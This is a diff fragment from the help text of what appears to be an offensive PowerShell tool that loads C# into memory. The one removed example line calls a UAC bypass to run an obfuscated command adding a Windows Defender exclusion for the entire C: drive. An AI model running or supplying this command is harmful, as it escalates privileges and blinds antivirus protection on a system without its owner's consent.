@@ -12,7 +12,7 @@ Este script usa código em C# para ser carregado na memória com PowerShell usan
 .PARAMETER Command
 
 .EXAMPLE
-invoke-UACBypass -execApp "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\" 
+
 
 #>
 
